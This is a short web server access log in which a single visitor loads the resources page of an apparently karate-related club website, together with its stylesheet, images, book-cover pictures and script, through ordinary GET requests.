::ffff:98.234.224.71 - - [26/Jul/2022:02:27:17 +0000] "GET /resources HTTP/1.1" 200 194907 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:17 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:18 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:18 +0000] "GET /images/JohnArce.jpg HTTP/1.1" 200 13951 "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:18 +0000] "GET /images/tm.jpg HTTP/1.1" 200 25020 "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:18 +0000] "GET /images/books/MBS2.jpg HTTP/1.1" 200 15317 "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:18 +0000] "GET /images/books/ZenMeditation.jpg HTTP/1.1" 200 3760 "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:18 +0000] "GET /images/books/MBS.gif HTTP/1.1" 200 13195 "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:18 +0000] "GET /images/books/karatebook.jpg HTTP/1.1" 200 7644 "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:18 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
